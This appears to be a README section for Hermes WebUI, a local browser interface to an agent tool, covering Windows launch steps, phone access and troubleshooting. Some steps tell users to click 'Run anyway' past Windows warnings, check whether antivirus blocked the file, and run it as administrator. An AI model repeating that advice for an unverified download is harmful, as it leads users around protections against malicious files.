## 🪟 Run on Windows

1. Open the folder where you saved the app
2. If you downloaded a `.zip` file, right-click it and choose Extract All
3. Open the extracted folder
4. Double-click the app file
5. If Windows asks for permission, choose Run anyway
6. Wait for the app to start
7. Open the address shown in the app in your browser

If you use a phone on the same network, you can open the same address from your phone browser.

## 🌐 What Hermes WebUI does

Hermes WebUI gives you a clean place to work with Hermes Agent. You can use it for:

- Chat-based agent tasks
- Browser access from Windows
- Phone use through a web page
- Simple control of agent actions
- Quick access to your Hermes workflow

It is built for people who want to use an agent without setting up a complex toolchain.

## 🧭 First-time setup

After you start the app:

1. Look for the local web address shown in the window
2. Open that address in your browser
3. Keep the app running while you use it
4. Sign in or connect your agent if the app asks you to
5. Start a new chat or task from the main screen

If the app shows a settings page first, you can leave most options at their default values.

## 📱 Use on your phone

Hermes WebUI works in a browser, so you can also use it from your phone.

1. Make sure your phone and Windows PC are on the same network
2. Start Hermes WebUI on your PC
3. Open the web address in your phone browser
4. Log in or connect if needed
5. Use the same web app interface on your phone

This makes it easy to check tasks when you are away from your desk.

## 🛠️ If the app does not open

If the app does not start, try these steps:

1. Check that the download finished
2. Make sure you extracted the files if they came in a `.zip`
3. Run the app file again
4. Check that your antivirus did not block the file
5. Try opening the app as an administrator
6. Restart your PC and try again

If the browser page does not load, close the app and start it again.
